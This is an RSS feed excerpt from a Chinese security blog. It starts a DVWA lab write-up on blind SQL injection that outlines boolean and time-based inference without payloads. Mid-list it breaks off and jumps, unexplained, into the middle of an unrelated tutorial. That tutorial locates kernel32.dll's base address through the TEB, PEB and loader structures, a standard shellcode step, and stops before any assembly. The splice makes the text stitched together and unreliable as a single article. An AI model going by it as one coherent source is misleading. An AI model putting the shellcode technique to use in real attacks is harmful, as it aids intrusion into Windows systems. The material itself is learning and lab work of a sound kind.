<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>weakptr's 笔记</title><link>https://nnnewb.github.io/blog/</link><description>Recent content on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 28 Apr 2022 11:30:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-SQL盲注</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</link><pubDate>Thu, 28 Apr 2022 11:30:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-07/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：&lt;/p>
&lt;ol>
&lt;li>页面显示内容。比如当SQL错误发生或&lt;code>WHERE&lt;/code>、&lt;code>ON&lt;/code>这样的条件子句不满足时和正常执行时网页内容不同。&lt;/li>
&lt;li>如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。&lt;/li>
&lt;li>可能还有其他的？&lt;/li>
&lt;/ol>

&lt;span class="n">ULONG&lt;/span> &lt;span class="n">ImageSubSystemMinorVersion&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">GdiHandleBuffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x22&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">PostProcessInitRoutine&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">TlsExpansionBitmap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BYTE&lt;/span> &lt;span class="n">TlsExpansionBitmapBits&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">SessionId&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">PEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接着从 PEB 找到 &lt;code>Ldr&lt;/code>，位置是 &lt;code>(sizeof(BOOLEAN)*4+sizeof(HANDLE)+sizeof(PVOID))==12==0xc&lt;/code>。&lt;/p>
&lt;h3 id="12-peb_ldr_data">1.2 PEB_LDR_DATA&lt;/h3>
&lt;p>接着从 &lt;code>PEB_LDR_DATA&lt;/code> 结构里找 &lt;code>InMemoryOrderModuleList&lt;/code> 这个字段，&lt;code>PEB_LDR_DATA&lt;/code> 结构如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_PEB_LDR_DATA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ULONG&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">BOOLEAN&lt;/span> &lt;span class="n">Initialized&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">SsHandle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InLoadOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InMemoryOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InInitializationOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">PEB_LDR_DATA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB_LDR_DATA&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>找到&lt;code>InMemoryOrderModuleList&lt;/code>字段，位置是&lt;code>(sizeof(ULONG)+sizeof(BOOLEAN)+sizeof(PVOID)+sizeof(LIST_ENTRY))==20==0x14&lt;/code>&lt;/p>
&lt;p>注意 &lt;code>sizeof(BOOLEAN)&lt;/code> 是 &lt;code>BYTE&lt;/code> 类型，但这个结构体是被对齐到了4字节的，所以 BOOLEAN 字段后面实际有3个字节的 padding。合起来就是三个 DWORD 。&lt;/p>
&lt;h3 id="13-ldr_data_table_entry">1.3 LDR_DATA_TABLE_ENTRY&lt;/h3>
&lt;p>之后就是 LIST_ENTRY 这个结构了，用 WinDbg 查了下结构：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _LIST_ENTRY
ntdll!_LIST_ENTRY
+0x000 Flink : Ptr32 _LIST_ENTRY
+0x004 Blink : Ptr32 _LIST_ENTRY
&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据上面 &lt;em>Undocumented&lt;/em> 文档和原文章的叙述来看，这应该就是个指向 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构（双向链表）的指针。&lt;code>_LIST_ENTRY&lt;/code>结构本身是包含两个指针，一个&lt;code>Forward&lt;/code>正向指针，一个&lt;code>Backward&lt;/code>。所以我们取&lt;code>Flink&lt;/code>字段就可以，跳过&lt;code>InLoadOrderModuleList&lt;/code>这个字段后，一共偏移 &lt;code>0x14&lt;/code> 就是我们要的 &lt;code>Flink&lt;/code> 指针了，指向的应该是 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 这个结构体中的 &lt;code>InMemoryOrderLinks&lt;/code> 字段。下面给出&lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code>的结构（WinDbg）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _ldr_data_table_entry
ntdll!_LDR_DATA_TABLE_ENTRY
+0x000 InLoadOrderLinks : _LIST_ENTRY
+0x008 InMemoryOrderLinks : _LIST_ENTRY
+0x010 InInitializationOrderLinks : _LIST_ENTRY
+0x018 DllBase : Ptr32 Void
+0x01c EntryPoint : Ptr32 Void
+0x020 SizeOfImage : Uint4B
+0x024 FullDllName : _UNICODE_STRING
+0x02c BaseDllName : _UNICODE_STRING
+0x034 FlagGroup : [4] UChar
+0x034 Flags : Uint4B
+0x034 PackagedBinary : Pos 0, 1 Bit
+0x034 MarkedForRemoval : Pos 1, 1 Bit
+0x034 ImageDll : Pos 2, 1 Bit
+0x034 LoadNotificationsSent : Pos 3, 1 Bit
+0x034 TelemetryEntryProcessed : Pos 4, 1 Bit
+0x034 ProcessStaticImport : Pos 5, 1 Bit
+0x034 InLegacyLists : Pos 6, 1 Bit
+0x034 InIndexes : Pos 7, 1 Bit
+0x034 ShimDll : Pos 8, 1 Bit
+0x034 InExceptionTable : Pos 9, 1 Bit
+0x034 ReservedFlags1 : Pos 10, 2 Bits
+0x034 LoadInProgress : Pos 12, 1 Bit
+0x034 LoadConfigProcessed : Pos 13, 1 Bit
+0x034 EntryProcessed : Pos 14, 1 Bit
+0x034 ProtectDelayLoad : Pos 15, 1 Bit
+0x034 ReservedFlags3 : Pos 16, 2 Bits
+0x034 DontCallForThreads : Pos 18, 1 Bit
+0x034 ProcessAttachCalled : Pos 19, 1 Bit
+0x034 ProcessAttachFailed : Pos 20, 1 Bit
+0x034 CorDeferredValidate : Pos 21, 1 Bit
+0x034 CorImage : Pos 22, 1 Bit
+0x034 DontRelocate : Pos 23, 1 Bit
+0x034 CorILOnly : Pos 24, 1 Bit
+0x034 ChpeImage : Pos 25, 1 Bit
+0x034 ReservedFlags5 : Pos 26, 2 Bits
+0x034 Redirected : Pos 28, 1 Bit
+0x034 ReservedFlags6 : Pos 29, 2 Bits
+0x034 CompatDatabaseProcessed : Pos 31, 1 Bit
+0x038 ObsoleteLoadCount : Uint2B
+0x03a TlsIndex : Uint2B
+0x03c HashLinks : _LIST_ENTRY
+0x044 TimeDateStamp : Uint4B
+0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+0x04c Lock : Ptr32 Void
+0x050 DdagNode : Ptr32 _LDR_DDAG_NODE
+0x054 NodeModuleLink : _LIST_ENTRY
+0x05c LoadContext : Ptr32 _LDRP_LOAD_CONTEXT
+0x060 ParentDllBase : Ptr32 Void
+0x064 SwitchBackContext : Ptr32 Void
+0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE
+0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE
+0x080 OriginalBase : Uint4B
+0x088 LoadTime : _LARGE_INTEGER
+0x090 BaseNameHashValue : Uint4B
+0x094 LoadReason : _LDR_DLL_LOAD_REASON
+0x098 ImplicitPathOptions : Uint4B
+0x09c ReferenceCount : Uint4B
+0x0a0 DependentLoadFlags : Uint4B
+0x0a4 SigningLevel : UChar
&lt;/code>&lt;/pre>&lt;/div>&lt;p>要注意到 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构中的 &lt;code>InMemoryOrderLinks&lt;/code> 并不是在结构开头，所以取得的地址必须先减去这个偏移值（8字节）再转换类型才是正确的结构。&lt;/p>
&lt;h3 id="14-模块基址">1.4 模块基址&lt;/h3>
&lt;p>接着从 WinDbg 可以实际发现，这个链表里，我们的程序之后就是&lt;code>ntdll.dll&lt;/code>，再之后就是&lt;code>kernel32.dll&lt;/code>，不再演示。反正就当&lt;code>kernel32.dll&lt;/code>固定在这个链表的第三个元素就是了。真要高鲁棒性的话就得遍历这个链表，按名字找出 &lt;code>kernel32.dll&lt;/code> 对应的结构，再取地址——麻烦死了。&lt;/p>
&lt;p>取得 &lt;code>kernel32.dll&lt;/code> 对应的 &lt;code>_LDR_DATA_TABLE_ENTRY&lt;/code> 结构后，就可以提取其中的 &lt;code>DllBase&lt;/code> 字段了，这个字段就是 &lt;code>kernel32.dll&lt;/code> 的基址。&lt;/p>
&lt;h3 id="15-teb-的位置">1.5 TEB 的位置&lt;/h3>
&lt;p>谷歌一下不难找到，Win32程序进程地址空间里，TEB的地址就在 &lt;code>[fs:0]&lt;/code> 这个地址上。&lt;/p>
&lt;h3 id="16-获取-kernel-32-基址">1.6 获取 kernel 32 基址&lt;/h3>
&lt;p>那就开始写汇编。&lt;/p>
